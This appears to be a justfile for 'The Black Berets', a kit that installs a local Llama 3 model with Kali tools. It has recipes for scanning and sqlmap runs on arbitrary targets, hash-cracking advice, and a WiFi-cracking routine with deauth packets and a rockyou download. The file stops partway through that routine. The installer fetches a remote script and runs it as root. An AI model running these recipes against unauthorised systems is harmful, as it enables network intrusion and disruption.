# The Black Berets - Just Commands
# Commands for running llama.cpp + LocalAI + Llama 3 8B

# Default recipe - show available commands
default:
    @just --list

# Get and run the install script
install:
    #!/usr/bin/env bash
    set -euo pipefail
    echo "=========================================="
    echo "Getting and running install script"
    echo "=========================================="
    
    INSTALL_SCRIPT="/tmp/install.sh"
    SITE_URL="https://theblackberets.github.io"
    
    # Check if install.sh exists locally first
    if [ -f "./install.sh" ]; then
        echo "Using local install.sh..."
        INSTALL_SCRIPT="./install.sh"
    else
        echo "Downloading install.sh from $SITE_URL..."
        
        # Try to download from the site
        if command -v wget >/dev/null 2>&1; then
            wget -qO "$INSTALL_SCRIPT" "$SITE_URL/install.sh" || {
                echo "Failed to download from $SITE_URL, trying GitHub..."
                wget -qO "$INSTALL_SCRIPT" "https://raw.githubusercontent.com/theblackberets/theblackberets.github.io/main/install.sh" || {
                    echo "ERROR: Failed to download install.sh"
                    exit 1
                }
            }
        elif command -v curl >/dev/null 2>&1; then
            curl -fsSL "$SITE_URL/install.sh" -o "$INSTALL_SCRIPT" || {
                echo "Failed to download from $SITE_URL, trying GitHub..."
                curl -fsSL "https://raw.githubusercontent.com/theblackberets/theblackberets.github.io/main/install.sh" -o "$INSTALL_SCRIPT" || {
                    echo "ERROR: Failed to download install.sh"
                    exit 1
                }
            }
        else
            echo "ERROR: Need wget or curl to download install.sh"
            exit 1
        fi
        
        chmod +x "$INSTALL_SCRIPT"
    fi
    
    echo "Running install script..."
    echo "NOTE: This requires root privileges (doas/sudo)"
    echo ""
    
    # Function to get privilege escalation command
    get_priv_cmd() {
        if [ "$(id -u)" = "0" ]; then
            echo ""
        elif command -v doas >/dev/null 2>&1; then
            echo "doas"
        elif command -v sudo >/dev/null 2>&1; then
            echo "sudo"
        else
            echo "ERROR"
        fi
    }
    
    PRIV_CMD=$(get_priv_cmd)
    if [ "$PRIV_CMD" = "ERROR" ]; then
        echo "ERROR: Need root privileges. Run as root or install doas/sudo"
        echo "You can also run manually: bash $INSTALL_SCRIPT"
        exit 1
    elif [ -z "$PRIV_CMD" ]; then
        bash "$INSTALL_SCRIPT"
    else
        $PRIV_CMD bash "$INSTALL_SCRIPT"
    fi
    
    # Cleanup if we downloaded to /tmp
    if [ "$INSTALL_SCRIPT" = "/tmp/install.sh" ]; then
        rm -f "$INSTALL_SCRIPT"
    fi

# Install llama.cpp
install-llamacpp:
    #!/usr/bin/env bash
    set -euo pipefail
    echo "Installing llama.cpp..."
    if [ -d "llama.cpp" ]; then
        echo "llama.cpp directory exists, updating..."
        cd llama.cpp && git pull
    else
        git clone https://github.com/ggerganov/llama.cpp.git
        cd llama.cpp
    fi
    make -j$(nproc)

# Install LocalAI
install-localai:
    #!/usr/bin/env bash
    set -euo pipefail
    echo "Installing LocalAI..."
    if command -v localai >/dev/null 2>&1; then
        echo "LocalAI is already installed"
        localai --version
    else
        echo "Downloading LocalAI..."
        ARCH=$(uname -m)
        OS=$(uname -s | tr '[:upper:]' '[:lower:]')
        if [ "$ARCH" = "x86_64" ]; then
            ARCH="amd64"
        fi
        LOCALAI_VERSION="v2.17.0"
        wget -qO /tmp/localai "https://github.com/mudler/LocalAI/releases/download/${LOCALAI_VERSION}/local-ai-${OS}-${ARCH}"
        chmod +x /tmp/localai
        sudo mv /tmp/localai /usr/local/bin/localai
        echo "LocalAI installed successfully"
    fi

# Download Llama 3 8B model
download-llama3-8b MODEL_DIR="./models":
    #!/usr/bin/env bash
    set -euo pipefail
    echo "Downloading Llama 3 8B model..."
    mkdir -p {{MODEL_DIR}}
    cd {{MODEL_DIR}}
    
    # Download Llama 3 8B Instruct Q4_K_M (quantized, good balance)
    MODEL_FILE="llama-3-8b-instruct-q4_k_m.gguf"
    if [ -f "$MODEL_FILE" ]; then
        echo "Model file already exists: $MODEL_FILE"
    else
        echo "Downloading Llama 3 8B Instruct Q4_K_M..."
        # Using Hugging Face model (you may need to authenticate for some models)
        # Alternative: use a direct download link if available
        echo "Please download the model manually or configure Hugging Face authentication"
        echo "Model URL: https://huggingface.co/bartowski/Llama-3-8B-Instruct-GGUF"
        echo "Recommended file: llama-3-8b-instruct-q4_k_m.gguf"
        echo ""
        echo "Or use:"
        echo "  huggingface-cli download bartowski/Llama-3-8B-Instruct-GGUF llama-3-8b-instruct-q4_k_m.gguf --local-dir {{MODEL_DIR}}"
    fi

# Convert model to GGUF format (if needed)
convert-model MODEL_PATH MODEL_OUTPUT:
    #!/usr/bin/env bash
    set -euo pipefail
    echo "Converting model to GGUF format..."
    if [ ! -d "llama.cpp" ]; then
        just install-llamacpp
    fi
    cd llama.cpp
    python3 convert.py {{MODEL_PATH}} --outfile {{MODEL_OUTPUT}} --outtype f16

# Quantize model
quantize-model MODEL_INPUT MODEL_OUTPUT QUANT_TYPE="Q4_K_M":
    #!/usr/bin/env bash
    set -euo pipefail
    echo "Quantizing model..."
    if [ ! -d "llama.cpp" ]; then
        just install-llamacpp
    fi
    cd llama.cpp
    ./quantize {{MODEL_INPUT}} {{MODEL_OUTPUT}} {{QUANT_TYPE}}

# Setup LocalAI configuration
setup-localai-config CONFIG_DIR="./localai-config":
    #!/usr/bin/env bash
    set -euo pipefail
    echo "Setting up LocalAI configuration..."
    mkdir -p {{CONFIG_DIR}}/models
    mkdir -p {{CONFIG_DIR}}/images
    
    # Create LocalAI config file
    {
        echo 'models_path: "{{CONFIG_DIR}}/models"'
        echo 'threads: 4'
        echo 'context_size: 4096'
        echo 'f16: true'
        echo 'debug: true'
        echo 'models:'
        echo '  - name: llama-3-8b'
        echo '    backend: llama-stable'
        echo '    parameters:'
        echo '      model: llama-3-8b-instruct-q4_k_m.gguf'
        echo '      temperature: 0.7'
        echo '      top_p: 0.9'
        echo '      top_k: 40'
        echo '      stop:'
        echo '        - "<|eot_id|>"'
        echo '        - "<|end_of_text|>"'
    } > {{CONFIG_DIR}}/config.yaml
    echo "Configuration created at {{CONFIG_DIR}}/config.yaml"

# Run LocalAI server
run-localai MODEL_DIR="./models" CONFIG_DIR="./localai-config" PORT="8080":
    #!/usr/bin/env bash
    set -euo pipefail
    echo "Starting LocalAI server..."
    
    # Ensure LocalAI is installed
    if ! command -v localai >/dev/null 2>&1; then
        echo "LocalAI not found, installing..."
        just install-localai || {
            echo "ERROR: Failed to install LocalAI"
            exit 1
        }
    fi
    
    # Verify LocalAI is executable
    if [ ! -x "$(command -v localai)" ]; then
        echo "ERROR: LocalAI is not executable"
        exit 1
    fi
    
    # Setup config if it doesn't exist
    if [ ! -f "{{CONFIG_DIR}}/config.yaml" ]; then
        echo "Creating LocalAI configuration..."
        just setup-localai-config CONFIG_DIR={{CONFIG_DIR}} || {
            echo "ERROR: Failed to create configuration"
            exit 1
        }
    fi
    
    # Verify config file exists
    if [ ! -f "{{CONFIG_DIR}}/config.yaml" ]; then
        echo "ERROR: Configuration file not found: {{CONFIG_DIR}}/config.yaml"
        exit 1
    fi
    
    # Copy model to config directory if needed
    if [ -d "{{MODEL_DIR}}" ]; then
        mkdir -p "{{CONFIG_DIR}}/models"
        cp -n {{MODEL_DIR}}/*.gguf {{CONFIG_DIR}}/models/ 2>/dev/null || true
    fi
    
    # Check if models directory has at least one model
    if ! ls "{{CONFIG_DIR}}/models"/*.gguf >/dev/null 2>&1; then
        echo "WARNING: No GGUF model files found in {{CONFIG_DIR}}/models/"
        echo "Download a model first: just download-llama3-8b"
    fi
    
    echo "Starting LocalAI on port {{PORT}}..."
    echo "API will be available at: http://localhost:{{PORT}}"
    echo "Press Ctrl+C to stop"
    
    # Run LocalAI with error handling
    if ! localai --config-file {{CONFIG_DIR}}/config.yaml --address "0.0.0.0:{{PORT}}" 2>&1; then
        echo "ERROR: LocalAI failed to start"
        echo "Check the configuration file and model files"
        exit 1
    fi

# Run LocalAI with Llama 3 8B (all-in-one command)
run MODEL_DIR="./models" CONFIG_DIR="./localai-config" PORT="8080":
    #!/usr/bin/env bash
    set -euo pipefail
    echo "=========================================="
    echo "Setting up Llama 3 8B + LocalAI"
    echo "=========================================="
    
    # Validate port is a number
    if ! [[ "{{PORT}}" =~ ^[0-9]+$ ]] || [ "{{PORT}}" -lt 1 ] || [ "{{PORT}}" -gt 65535 ]; then
        echo "ERROR: Invalid port number: {{PORT}}"
        exit 1
    fi
    
    # Check if model exists (try multiple common names)
    MODEL_FILE=""
    for model_name in "llama-3-8b-instruct-q4_k_m.gguf" "llama-3-8b-instruct.gguf" "llama-3-8b.gguf"; do
        if [ -f "{{MODEL_DIR}}/$model_name" ]; then
            MODEL_FILE="{{MODEL_DIR}}/$model_name"
            break
        fi
    done
    
    if [ -z "$MODEL_FILE" ]; then
        echo "Model not found. Please download it first:"
        echo "  just download-llama3-8b MODEL_DIR={{MODEL_DIR}}"
        echo ""
        echo "Or place your GGUF model file in: {{MODEL_DIR}}/"
        echo "Looking for: llama-3-8b-instruct-q4_k_m.gguf"
        exit 1
    fi
    
    echo "Using model: $MODEL_FILE"
    
    # Check if port is already in use
    if command -v lsof >/dev/null 2>&1; then
        if lsof -Pi :{{PORT}} -sTCP:LISTEN -t >/dev/null 2>&1; then
            echo "WARNING: Port {{PORT}} is already in use"
            echo "Stop the existing service or use a different port"
            exit 1
        fi
    fi
    
    # Run LocalAI
    just run-localai MODEL_DIR={{MODEL_DIR}} CONFIG_DIR={{CONFIG_DIR}} PORT={{PORT}}

# Start LocalAI with Kali tools environment (LOCAL_AI command)
local-ai MODEL_DIR="./models" CONFIG_DIR="./localai-config" PORT="8080":
    #!/usr/bin/env bash
    set -euo pipefail
    echo "=========================================="
    echo "Starting LocalAI with Kali Tools"
    echo "=========================================="
    
    # Enable Nix commands and Kali tools
    if [ -f /nix/var/nix/profiles/default/etc/profile.d/nix-daemon.sh ]; then
        . /nix/var/nix/profiles/default/etc/profile.d/nix-daemon.sh
    elif [ -f /etc/profile.d/nix.sh ]; then
        . /etc/profile.d/nix.sh
    elif [ -f /root/.nix-profile/etc/profile.d/nix.sh ]; then
        . /root/.nix-profile/etc/profile.d/nix.sh
    fi
    
    # Verify Kali tools are available (should be pre-installed)
    if ! command -v nmap >/dev/null 2>&1; then
        echo "ERROR: Kali tools not found. They should be pre-installed via Nix."
        echo "Run: doas ./install.sh to install them"
        exit 1
    fi
    
    # Set LOCAL_AI environment variable
    export LOCAL_AI="http://localhost:{{PORT}}"
    export LOCALAI_PORT="{{PORT}}"
    export LOCALAI_MODEL_DIR="{{MODEL_DIR}}"
    export LOCALAI_CONFIG_DIR="{{CONFIG_DIR}}"
    
    echo "Environment configured:"
    echo "  LOCAL_AI=$LOCAL_AI"
    echo "  LOCALAI_PORT=$LOCALAI_PORT"
    echo "  Kali tools: Available in PATH"
    echo ""
    
    # Run LocalAI with Kali tools environment
    just run MODEL_DIR={{MODEL_DIR}} CONFIG_DIR={{CONFIG_DIR}} PORT={{PORT}}

# Test LocalAI API
test-api PORT="8080":
    #!/usr/bin/env bash
    set -euo pipefail
    echo "Testing LocalAI API..."
    curl -X POST http://localhost:{{PORT}}/v1/chat/completions \
        -H "Content-Type: application/json" \
        -d '{
            "model": "llama-3-8b",
            "messages": [
                {"role": "user", "content": "Hello! Can you introduce yourself?"}
            ],
            "temperature": 0.7
        }' | jq '.'

# Clean up build artifacts
clean:
    #!/usr/bin/env bash
    echo "Cleaning up..."
    if [ -d "llama.cpp" ]; then
        cd llama.cpp && make clean
    fi
    echo "Cleanup complete"

# Full setup: install everything and download model
setup MODEL_DIR="./models" CONFIG_DIR="./localai-config":
    #!/usr/bin/env bash
    set -euo pipefail
    echo "=========================================="
    echo "Full Setup: llama.cpp + LocalAI + Llama 3 8B"
    echo "=========================================="
    just install-llamacpp
    just install-localai
    just setup-localai-config CONFIG_DIR={{CONFIG_DIR}}
    echo ""
    echo "Setup complete!"
    echo ""
    echo "Next steps:"
    echo "1. Download the Llama 3 8B model:"
    echo "   just download-llama3-8b MODEL_DIR={{MODEL_DIR}}"
    echo ""
    echo "2. Run LocalAI:"
    echo "   just run MODEL_DIR={{MODEL_DIR}} CONFIG_DIR={{CONFIG_DIR}}"
    echo ""

# NOTE: Kali tools are pre-installed globally via Nix during install.sh
# This command verifies installation and shows available tools
verify-kali-tools:
    #!/usr/bin/env bash
    set -euo pipefail
    echo "Verifying Kali tools installation..."
    
    # Enable Nix commands
    [ -f /nix/var/nix/profiles/default/etc/profile.d/nix-daemon.sh ] && . /nix/var/nix/profiles/default/etc/profile.d/nix-daemon.sh || true
    [ -f /etc/profile.d/nix.sh ] && . /etc/profile.d/nix.sh || true
    
    if ! command -v nix >/dev/null 2>&1; then
        echo "ERROR: Nix is not installed. Please run: doas ./install.sh"
        exit 1
    fi
    
    # Check if tools are available
    TOOLS_FOUND=0
    for tool in nmap sqlmap john hashcat aircrack-ng; do
        if command -v "$tool" >/dev/null 2>&1; then
            echo "✓ $tool: $(command -v $tool)"
            TOOLS_FOUND=$((TOOLS_FOUND + 1))
        else
            echo "✗ $tool: Not found"
        fi
    done
    
    if [ "$TOOLS_FOUND" -eq 0 ]; then
        echo ""
        echo "ERROR: Kali tools not found. They should be pre-installed."
        echo "Run: doas ./install.sh to install them"
        exit 1
    else
        echo ""
        echo "✓ Kali tools are available ($TOOLS_FOUND/5 key tools found)"
        echo "All tools are pre-installed globally via Nix (NixOS-style)"
    fi

# NOTE: Kali tools are pre-installed globally via Nix during install.sh
# This command is kept for compatibility but tools should already be installed
install-kali-tools-global:
    #!/usr/bin/env bash
    set -euo pipefail
    echo "NOTE: Kali tools should already be pre-installed globally via Nix"
    echo "Running verification instead..."
    just verify-kali-tools

# NOTE: Cool terminal tools are pre-installed globally via Nix during install.sh
# This command verifies installation and shows available tools
verify-cool-terminal:
    #!/usr/bin/env bash
    set -euo pipefail
    echo "Verifying cool terminal tools installation..."
    
    # Enable Nix commands
    [ -f /nix/var/nix/profiles/default/etc/profile.d/nix-daemon.sh ] && . /nix/var/nix/profiles/default/etc/profile.d/nix-daemon.sh || true
    [ -f /etc/profile.d/nix.sh ] && . /etc/profile.d/nix.sh || true
    
    if ! command -v nix >/dev/null 2>&1; then
        echo "ERROR: Nix is not installed. Please run: doas ./install.sh"
        exit 1
    fi
    
    # Check if tools are available
    TOOLS_FOUND=0
    for tool in starship bat exa fd rg fzf tmux zsh; do
        if command -v "$tool" >/dev/null 2>&1; then
            echo "✓ $tool: $(command -v $tool)"
            TOOLS_FOUND=$((TOOLS_FOUND + 1))
        else
            echo "✗ $tool: Not found"
        fi
    done
    
    if [ "$TOOLS_FOUND" -eq 0 ]; then
        echo ""
        echo "ERROR: Cool terminal tools not found. They should be pre-installed."
        echo "Run: doas ./install.sh to install them"
        exit 1
    else
        echo ""
        echo "✓ Cool terminal tools are available ($TOOLS_FOUND/8 key tools found)"
        echo "All tools are pre-installed globally via Nix (NixOS-style)"
    fi

# NOTE: Cool terminal tools are pre-installed globally via Nix during install.sh
# This command is kept for compatibility but tools should already be installed
install-cool-terminal-global:
    #!/usr/bin/env bash
    set -euo pipefail
    echo "NOTE: Cool terminal tools should already be pre-installed globally via Nix"
    echo "Running verification instead..."
    just verify-cool-terminal

# Update all packages from flake.nix (applies latest flake.nix changes)
update-from-flake:
    #!/usr/bin/env bash
    set -euo pipefail
    echo "=========================================="
    echo "Updating all packages from flake.nix"
    echo "This ensures latest flake.nix changes are applied"
    echo "=========================================="
    
    # Enable Nix commands
    if [ -f /nix/var/nix/profiles/default/etc/profile.d/nix-daemon.sh ]; then
        . /nix/var/nix/profiles/default/etc/profile.d/nix-daemon.sh
    fi
    
    if ! command -v nix >/dev/null 2>&1; then
        echo "ERROR: Nix is not installed. Please run: doas ./install.sh"
        exit 1
    fi
    
    # Enable flakes if needed
    if ! nix show-config 2>/dev/null | grep -q "experimental-features.*flakes"; then
        echo "Enabling Nix flakes..."
        mkdir -p /etc/nix
        echo "experimental-features = nix-command flakes" >> /etc/nix/nix.conf 2>/dev/null || true
    fi
    
    # Determine flake location
    FLAKE_DIR=""
    SITE_URL="https://theblackberets.github.io"
    
    if [ -f "flake.nix" ]; then
        FLAKE_DIR="."
        echo "Using local flake.nix"
    elif command -v wget >/dev/null 2>&1 || command -v curl >/dev/null 2>&1; then
        echo "Downloading latest flake.nix from $SITE_URL..."
        if command -v wget >/dev/null 2>&1; then
            wget -qO /tmp/flake.nix "$SITE_URL/flake.nix" 2>/dev/null && FLAKE_DIR="/tmp"
        elif command -v curl >/dev/null 2>&1; then
            curl -fsSL "$SITE_URL/flake.nix" -o /tmp/flake.nix 2>/dev/null && FLAKE_DIR="/tmp"
        fi
    else
        echo "ERROR: Need wget or curl to download flake.nix, or run from directory with flake.nix"
        exit 1
    fi
    
    if [ -z "$FLAKE_DIR" ] || [ ! -f "$FLAKE_DIR/flake.nix" ]; then
        echo "ERROR: Could not find or download flake.nix"
        exit 1
    fi
    
    # Update flake inputs to get latest changes
    echo ""
    echo "Step 1: Updating flake inputs..."
    if (cd "$FLAKE_DIR" && nix flake update); then
        echo "✓ Flake inputs updated successfully"
    else
        echo "WARNING: Flake update had issues, continuing with current state..."
    fi
    
    # Update just from flake
    echo ""
    echo "Step 2: Updating just from flake.nix..."
    if nix profile install "$FLAKE_DIR#just" --reinstall >/dev/null 2>&1 || \
       nix profile install "$FLAKE_DIR#just" >/dev/null 2>&1; then
        echo "✓ just updated successfully"
    else
        echo "WARNING: Failed to update just, may already be up to date"
    fi
    
    # Update kali-tools from flake
    echo ""
    echo "Step 3: Updating kali-tools from flake.nix..."
    if nix profile install "$FLAKE_DIR#kali-tools" --reinstall >/dev/null 2>&1 || \
       nix profile install "$FLAKE_DIR#kali-tools" >/dev/null 2>&1; then
        echo "✓ kali-tools updated successfully"
    else
        echo "WARNING: Failed to update kali-tools, may already be up to date"
    fi
    
    echo ""
    echo "=========================================="
    echo "Update completed!"
    echo "=========================================="
    echo ""
    echo "All packages have been updated from the latest flake.nix"
    echo "Run 'nix profile list' to see installed packages"

# Analyze nmap scan results with LocalAI
analyze-nmap TARGET PORT="8080":
    #!/usr/bin/env bash
    set -euo pipefail
    echo "Running nmap scan on {{TARGET}}..."
    
    # Validate target
    if [ -z "{{TARGET}}" ]; then
        echo "ERROR: Target is required"
        exit 1
    fi
    
    # Enable Nix commands
    if [ -f /nix/var/nix/profiles/default/etc/profile.d/nix-daemon.sh ]; then
        . /nix/var/nix/profiles/default/etc/profile.d/nix-daemon.sh
    fi
    
    # Check if nmap is available
    if ! command -v nmap >/dev/null 2>&1; then
        echo "ERROR: nmap not found. Kali tools should be pre-installed via Nix."
        echo "Run: doas ./install.sh to install them"
        exit 1
    fi
    
    # Run nmap scan with error handling
    SCAN_OUTPUT=$(mktemp)
    trap "rm -f $SCAN_OUTPUT" EXIT
    
    if ! nmap -sV -sC {{TARGET}} > "$SCAN_OUTPUT" 2>&1; then
        echo "WARNING: nmap scan had errors, but continuing..."
    fi
    
    SCAN_RESULTS=$(cat "$SCAN_OUTPUT" || echo "Scan failed")
    
    # Check if LocalAI is running
    if ! curl -s http://localhost:{{PORT}}/health >/dev/null 2>&1; then
        echo "WARNING: LocalAI is not running. Showing raw scan results:"
        echo "$SCAN_RESULTS"
        exit 0
    fi
    
    echo "Scan completed. Analyzing results with LocalAI..."
    
    # Send to LocalAI for analysis with error handling
    ANALYSIS=$(curl -s -X POST http://localhost:{{PORT}}/v1/chat/completions \
        -H "Content-Type: application/json" \
        -d "{
            \"model\": \"llama-3-8b\",
            \"messages\": [
                {\"role\": \"system\", \"content\": \"You are a cybersecurity expert. Analyze nmap scan results and provide security recommendations.\"},
                {\"role\": \"user\", \"content\": \"Analyze these nmap scan results and provide security insights:\\n\\n$SCAN_RESULTS\"}
            ],
            \"temperature\": 0.3
        }" 2>/dev/null | jq -r '.choices[0].message.content // "Analysis failed"' 2>/dev/null || echo "Failed to get AI analysis")
    
    if [ -n "$ANALYSIS" ] && [ "$ANALYSIS" != "Analysis failed" ]; then
        echo "$ANALYSIS"
    else
        echo "Raw scan results:"
        echo "$SCAN_RESULTS"
    fi

# Analyze SQL injection test results with LocalAI
analyze-sqlmap URL PORT="8080":
    #!/usr/bin/env bash
    set -euo pipefail
    echo "Running sqlmap on {{URL}}..."
    
    # Enable Nix commands
    if [ -f /nix/var/nix/profiles/default/etc/profile.d/nix-daemon.sh ]; then
        . /nix/var/nix/profiles/default/etc/profile.d/nix-daemon.sh
    fi
    
    if ! command -v sqlmap >/dev/null 2>&1; then
        echo "ERROR: sqlmap not found. Kali tools should be pre-installed via Nix."
        echo "Run: doas ./install.sh to install them"
        exit 1
    fi
    
    # Run sqlmap (basic scan)
    SQLMAP_OUTPUT=$(mktemp)
    sqlmap -u "{{URL}}" --batch --crawl=2 --level=1 --risk=1 > "$SQLMAP_OUTPUT" 2>&1 || true
    
    SQLMAP_RESULTS=$(cat "$SQLMAP_OUTPUT")
    echo "Scan completed. Analyzing results with LocalAI..."
    
    # Send to LocalAI for analysis
    curl -X POST http://localhost:{{PORT}}/v1/chat/completions \
        -H "Content-Type: application/json" \
        -d "{
            \"model\": \"llama-3-8b\",
            \"messages\": [
                {\"role\": \"system\", \"content\": \"You are a web security expert. Analyze sqlmap results and provide vulnerability assessment.\"},
                {\"role\": \"user\", \"content\": \"Analyze these sqlmap results:\\n\\n$SQLMAP_RESULTS\"}
            ],
            \"temperature\": 0.3
        }" | jq -r '.choices[0].message.content'
    
    rm "$SQLMAP_OUTPUT"

# Generate security report using LocalAI
security-report SCAN_TYPE DATA PORT="8080":
    #!/usr/bin/env bash
    set -euo pipefail
    echo "Generating security report with LocalAI..."
    
    PROMPT=$'Generate a professional security assessment report based on this {{SCAN_TYPE}} data:\n\n{{DATA}}\n\nInclude: Executive Summary, Findings, Risk Assessment, and Recommendations.'
    
    curl -X POST http://localhost:{{PORT}}/v1/chat/completions \
        -H "Content-Type: application/json" \
        -d "{
            \"model\": \"llama-3-8b\",
            \"messages\": [
                {\"role\": \"system\", \"content\": \"You are a cybersecurity consultant writing professional security reports.\"},
                {\"role\": \"user\", \"content\": \"$PROMPT\"}
            ],
            \"temperature\": 0.4
        }" | jq -r '.choices[0].message.content'

# AI-assisted penetration testing workflow
pentest-ai TARGET PORT="8080":
    #!/usr/bin/env bash
    set -euo pipefail
    echo "=========================================="
    echo "AI-Assisted Penetration Testing"
    echo "Target: {{TARGET}}"
    echo "=========================================="
    
    # Enable Nix commands
    if [ -f /nix/var/nix/profiles/default/etc/profile.d/nix-daemon.sh ]; then
        . /nix/var/nix/profiles/default/etc/profile.d/nix-daemon.sh
    fi
    
    # Check if LocalAI is running
    if ! curl -s http://localhost:{{PORT}}/health >/dev/null 2>&1; then
        echo "ERROR: LocalAI is not running. Start it first: just run"
        exit 1
    fi
    
    # Get AI recommendations for testing approach
    echo "Getting AI recommendations for penetration testing approach..."
    RECOMMENDATIONS=$(curl -s -X POST http://localhost:{{PORT}}/v1/chat/completions \
        -H "Content-Type: application/json" \
        -d "{
            \"model\": \"llama-3-8b\",
            \"messages\": [
                {\"role\": \"system\", \"content\": \"You are an expert penetration tester. Provide a structured testing approach.\"},
                {\"role\": \"user\", \"content\": \"Create a penetration testing plan for target: {{TARGET}}. Include: reconnaissance, scanning, enumeration, vulnerability assessment, and exploitation phases.\"}
            ],
            \"temperature\": 0.5
        }" | jq -r '.choices[0].message.content')
    
    echo "$RECOMMENDATIONS"
    echo ""
    echo "Would you like to proceed with automated scans? (y/n)"
    read -r response
    
    if [ "$response" = "y" ] || [ "$response" = "Y" ]; then
        echo "Running automated scans..."
        just analyze-nmap {{TARGET}} PORT={{PORT}}
    fi

# Query LocalAI about security tools usage
ask-security-tool TOOL QUESTION PORT="8080":
    #!/usr/bin/env bash
    set -euo pipefail
    echo "Querying LocalAI about {{TOOL}}..."
    
    curl -X POST http://localhost:{{PORT}}/v1/chat/completions \
        -H "Content-Type: application/json" \
        -d "{
            \"model\": \"llama-3-8b\",
            \"messages\": [
                {\"role\": \"system\", \"content\": \"You are a cybersecurity expert specializing in penetration testing tools.\"},
                {\"role\": \"user\", \"content\": \"Tool: {{TOOL}}\\nQuestion: {{QUESTION}}\\n\\nProvide detailed guidance on how to use this tool effectively.\"}
            ],
            \"temperature\": 0.5
        }" | jq -r '.choices[0].message.content'

# Analyze password hash with LocalAI assistance
analyze-hash HASH_FILE PORT="8080":
    #!/usr/bin/env bash
    set -euo pipefail
    echo "Analyzing password hash file..."
    
    if [ ! -f "{{HASH_FILE}}" ]; then
        echo "ERROR: Hash file not found: {{HASH_FILE}}"
        exit 1
    fi
    
    # Enable Nix commands
    if [ -f /nix/var/nix/profiles/default/etc/profile.d/nix-daemon.sh ]; then
        . /nix/var/nix/profiles/default/etc/profile.d/nix-daemon.sh
    fi
    
    # Identify hash type (should be pre-installed)
    if ! command -v john >/dev/null 2>&1; then
        echo "ERROR: john not found. Kali tools should be pre-installed via Nix."
        echo "Run: doas ./install.sh to install them"
        exit 1
    fi
    HASH_INFO=$(john --list=formats 2>/dev/null || echo "Hash analysis tools available")
    
    FIRST_HASH=$(head -n1 "{{HASH_FILE}}")
    
    # Get AI analysis
    curl -X POST http://localhost:{{PORT}}/v1/chat/completions \
        -H "Content-Type: application/json" \
        -d "{
            \"model\": \"llama-3-8b\",
            \"messages\": [
                {\"role\": \"system\", \"content\": \"You are a password security expert.\"},
                {\"role\": \"user\", \"content\": \"Analyze this hash and provide recommendations:\\n\\nHash: $FIRST_HASH\\n\\nWhat type of hash is this? What tools and techniques would you recommend for cracking it?\"}
            ],
            \"temperature\": 0.3
        }" | jq -r '.choices[0].message.content'

# Create security testing checklist with AI
security-checklist TARGET PORT="8080":
    #!/usr/bin/env bash
    set -euo pipefail
    echo "Generating security testing checklist for {{TARGET}}..."
    
    curl -X POST http://localhost:{{PORT}}/v1/chat/completions \
        -H "Content-Type: application/json" \
        -d "{
            \"model\": \"llama-3-8b\",
            \"messages\": [
                {\"role\": \"system\", \"content\": \"You are a cybersecurity expert creating penetration testing checklists.\"},
                {\"role\": \"user\", \"content\": \"Create a comprehensive security testing checklist for: {{TARGET}}\\n\\nInclude: reconnaissance, network scanning, web application testing, authentication testing, and post-exploitation steps.\"}
            ],
            \"temperature\": 0.4
        }" | jq -r '.choices[0].message.content' > "security-checklist-{{TARGET}}.txt"
    
    echo "Checklist saved to: security-checklist-{{TARGET}}.txt"
    cat "security-checklist-{{TARGET}}.txt"

# Crack WiFi password (WPA/WPA2)
crack-wifi INTERFACE BSSID WORDLIST PORT="8080":
    #!/usr/bin/env bash
    set -euo pipefail
    
    # Enable Nix commands
    if [ -f /nix/var/nix/profiles/default/etc/profile.d/nix-daemon.sh ]; then
        . /nix/var/nix/profiles/default/etc/profile.d/nix-daemon.sh
    fi
    
    # Check for root privileges
    if [ "$(id -u)" != "0" ]; then
        if command -v doas >/dev/null 2>&1; then
            echo "ERROR: This command requires root privileges. Use: doas just crack-wifi"
        elif command -v sudo >/dev/null 2>&1; then
            echo "ERROR: This command requires root privileges. Use: sudo just crack-wifi"
        else
            echo "ERROR: This command requires root privileges. Run as root user."
        fi
        exit 1
    fi
    
    # Check if tools are available (should be pre-installed)
    if ! command -v aircrack-ng >/dev/null 2>&1; then
        echo "ERROR: aircrack-ng not found. Kali tools should be pre-installed via Nix."
        echo "Run: doas ./install.sh to install them"
        exit 1
    fi
    
    echo "=========================================="
    echo "WiFi Password Cracking"
    echo "Interface: {{INTERFACE}}"
    echo "BSSID: {{BSSID}}"
    echo "Wordlist: {{WORDLIST}}"
    echo "=========================================="
    echo ""
    
    # Check if interface exists
    if ! ip link show {{INTERFACE}} >/dev/null 2>&1; then
        echo "ERROR: Interface {{INTERFACE}} not found"
        echo "Available interfaces:"
        ip link show | grep -E "^[0-9]+:" | awk '{print $2}' | sed 's/:$//'
        exit 1
    fi
    
    # Check if wordlist exists
    if [ ! -f "{{WORDLIST}}" ]; then
        echo "Wordlist not found: {{WORDLIST}}"
        echo "Downloading rockyou.txt wordlist..."
        
        # Try to download rockyou wordlist
        if command -v wget >/dev/null 2>&1; then
            wget -q https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt -O rockyou.txt || {
                echo "Failed to download wordlist. Please provide a wordlist file."
                exit 1
            }
            WORDLIST="./rockyou.txt"
        elif command -v curl >/dev/null 2>&1; then
            curl -fsSL https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt -o rockyou.txt || {
                echo "Failed to download wordlist. Please provide a wordlist file."
                exit 1
            }
            WORDLIST="./rockyou.txt"
        else
            echo "ERROR: Need wget or curl to download wordlist, or provide your own wordlist file"
            exit 1
        fi
    else
        WORDLIST="{{WORDLIST}}"
    fi
    
    CAP_FILE="wifi-capture-{{BSSID}}.cap"
    HANDSHAKE_FILE="handshake-{{BSSID}}.cap"
    
    echo "Step 1: Putting interface in monitor mode..."
    airmon-ng check kill >/dev/null 2>&1 || true
    airmon-ng start {{INTERFACE}} >/dev/null 2>&1
    
    MON_INTERFACE="{{INTERFACE}}mon"
    if ! ip link show "$MON_INTERFACE" >/dev/null 2>&1; then
        MON_INTERFACE="{{INTERFACE}}"
    fi
    
    echo "Step 2: Capturing handshake (press Ctrl+C when handshake is captured)..."
    echo "Monitoring BSSID: {{BSSID}}"
    echo "Capture file: $CAP_FILE"
    echo ""
    echo "Waiting for handshake... (This may take a while)"
    
    # Start capture in background
    airodump-ng -c 1 --bssid {{BSSID}} -w "wifi-capture-{{BSSID}}" "$MON_INTERFACE" >/dev/null 2>&1 &
    AIRODUMP_PID=$!
    
    # Also deauth to force handshake
    echo "Sending deauth packets to force handshake..."
    aireplay-ng -0 5 -a {{BSSID}} "$MON_INTERFACE" >/dev/null 2>&1 &
    AIREPLAY_PID=$!
    
    # Wait for user to capture handshake
    echo ""
